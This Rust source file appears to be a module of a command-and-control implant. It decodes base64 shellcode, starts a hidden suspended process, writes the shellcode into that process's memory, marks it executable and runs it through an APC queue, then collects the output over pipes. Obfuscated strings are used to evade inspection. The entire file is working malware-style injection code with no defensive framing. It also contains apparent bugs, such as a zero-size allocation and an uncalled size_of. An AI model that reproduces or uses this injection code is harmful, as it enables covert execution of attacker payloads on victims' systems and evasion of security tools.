use std::{
    ffi::c_void,
    io::{Error, ErrorKind, Result},
    mem::{size_of, transmute},
    sync::mpsc::{channel, Receiver},
    thread,
    time::Duration,
};
use windows::{
    core::{HSTRING, PCWSTR, PWSTR},
    Win32::{
        Foundation::{
            CloseHandle, HANDLE, HANDLE_FLAG_INHERIT, SetHandleInformation,
            STILL_ACTIVE,
        },
        Security::SECURITY_ATTRIBUTES,
        Storage::FileSystem::ReadFile,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
                VirtualAllocEx, VirtualProtectEx
            },
            Pipes::CreatePipe,
            Threading::{
                CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessW,
                GetExitCodeThread,
                PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
                STARTUPINFOW, STARTUPINFOW_FLAGS
            },
        },
    },
};

struct HandleSend {
    handle: HANDLE,
}

unsafe impl Send for HandleSend {}

// Thanks:
//  https://github.com/postrequest/link/blob/main/src/links/windows/src/nonstd.rs#L108
pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::Result<Vec<u8>, Error> {
    let mut output: Vec<u8> = Vec::new();

    let mut shellcode = base64::decode(shellcode_b64).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void;

    let mut hread_stdin = HANDLE(0);
    let mut hwrite_stdin = HANDLE(0);
    let mut hread_stdout = HANDLE(0);
    let mut hwrite_stdout = HANDLE(0);

    let mut sa = SECURITY_ATTRIBUTES::default();

    // Create pipes
    let _ = unsafe {
        CreatePipe(
            &mut hread_stdin,
            &mut hwrite_stdin,
            Some(&mut sa),
            0,
        )
    };
    let _ = unsafe {
        SetHandleInformation(
            hwrite_stdin,
            0,
            HANDLE_FLAG_INHERIT,
        )
    };

    let _ = unsafe {
        CreatePipe(
            &mut hread_stdout,
            &mut hwrite_stdout,
            Some(&mut sa),
            0,
        )
    };
    let _ = unsafe {
        SetHandleInformation(
            hread_stdout,
            0,
            HANDLE_FLAG_INHERIT,
        )
    };

    let mut si = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW> as u32,
        lpReserved: PWSTR::null(),
        lpDesktop: PWSTR::null(),
        lpTitle: PWSTR::null(),
        dwX: 0,
        dwY: 0,
        dwXSize: 0,
        dwYSize: 0,
        dwXCountChars: 0,
        dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: STARTUPINFOW_FLAGS(256),
        wShowWindow: 1,
        cbReserved2: 0,
        lpReserved2: 0 as *mut u8,
        hStdInput: hread_stdin,
        hStdOutput: hwrite_stdout,
        hStdError: hwrite_stdout,
    };

    // let mut pi = PROCESS_INFORMATION {
    //     hProcess: HANDLE(0),
    //     hThread: HANDLE(0),
    //     dwProcessId: 0,
    //     dwThreadId: 0,
    // };
    let mut pi = PROCESS_INFORMATION::default();

    // Read the output of the shell in thread
    let mut out_buf: Vec<u8> = Vec::new();
    let (tx, rx) = channel::<String>();
    let (tx_kill, rx_kill) = channel::<bool>();
    let tmp_handle = HandleSend {
        handle: hread_stdout,
    };

    thread::spawn(move || {
        let ret = read_from_pipe(tmp_handle.handle, &mut out_buf, &rx_kill);
        match ret {
            Ok(_) => tx.send(String::from_utf8(out_buf).unwrap()).unwrap(),
            Err(_) => tx.send(obfstr::obfstr!("error reading from pipe").to_string()).unwrap(),
        }
    });

    // Spawn suspended process
    let mut process_name_clone = process_name.to_string();
    let mut process_name_ptr: *mut u16 = process_name_clone.as_mut_ptr() as *mut u16;
    let _ = unsafe {
        CreateProcessW(
            PCWSTR::null(),
            PWSTR(process_name_ptr),
            None,
            None,
            true,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            None,
            PCWSTR::null(),
            &mut si,
            &mut pi,
        )
    };

    let handle = pi.hProcess;

    // Allocate payload
    let shellcode_addr = unsafe {
        VirtualAllocEx(
            handle,
            None,
            0 as _,
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    let mut ret_len: usize = 0;
    let _ = unsafe {
        WriteProcessMemory(
            handle,
            shellcode_addr,
            shellcode_ptr,
            shellcode.len(),
            Some(&mut ret_len),
        )
    };

    // Protect
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    let _ = unsafe {
        VirtualProtectEx(
            handle,
            shellcode_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    // Queue shellcode for execution and resume thread
    let _ = unsafe {
        QueueUserAPC(
            Some(transmute(shellcode_addr)),
            pi.hThread,
            0 as _,
        )
    };
    let _ = unsafe { ResumeThread(pi.hThread) };

    // Close handles
    let _ = unsafe { CloseHandle(handle) };
    let _ = unsafe { CloseHandle(hwrite_stdout) };
    let _ = unsafe { CloseHandle(hread_stdin) };

    // Wait for thread to finish
    loop {
        let mut ret_code: u32 = 0;
        let _ = unsafe {
            GetExitCodeThread(
                pi.hThread,
                &mut ret_code,
            )
        };
        if ret_code == STILL_ACTIVE.0 as u32 {
            continue;
        } else {
            let _ = tx_kill.send(true);
            match rx.recv() {
                Ok(o) => {
                    output = o.into_bytes();
                    break;
                }
                Err(_) => {
                    // output = obfstr::obfstr!("Could not get the output.").to_string();
                    break;
                }
            }
        }
    }

    Ok(output)
}

// pub trait IsZero {
//     fn is_zero(&self) -> bool;
// }

// macro_rules! impl_is_zero {
//     ($($t:ident)*) => ($(impl IsZero for $t {
//         fn is_zero(&self) -> bool {
//             *self == 0
//         }
//     })*)
// }

// impl_is_zero! { i8 i16 i32 i64 isize u8 u16 u32 u64 usize }

// pub fn cvt<I: IsZero>(i: I) -> Result<I> {
//     if i.is_zero() { Err(Error::last_os_error()) } else { Ok(i) }
// }

fn read_from_pipe(
    handle: HANDLE,
    buf: &mut Vec<u8>,
    receiver: &Receiver<bool>
) -> Result<usize> {
    
    let mut total_read = 0;
    let receiver = receiver.to_owned();
    let mut complete = false;
    
    loop {
        let mut tmp_buf = [0u8; 10001];
        let mut numberofbytesread: u32 = 0;
        // let res = cvt(unsafe {
        //     ReadFile(
        //         handle,
        //         Some(&mut tmp_buf),
        //         Some(&mut numberofbytesread),
        //         None,
        //     )
        // });

        let res = unsafe {
            ReadFile(
                handle,
                Some(&mut tmp_buf),
                Some(&mut numberofbytesread),
                None,
            )
        };

        match res {
            Ok(_) => {
                buf.extend_from_slice(&tmp_buf);
                total_read = total_read + numberofbytesread;
            },
            // Err(ref e) if e.kind() == ErrorKind::BrokenPipe => break,
            Err(_) => break,
        }

        if complete {
            continue;
        }

        match receiver.recv_timeout(Duration::from_millis(100)) {
            Ok(_) => { complete = true; },
            Err(_) => {},
        }
    }
    Ok(total_read as usize)
}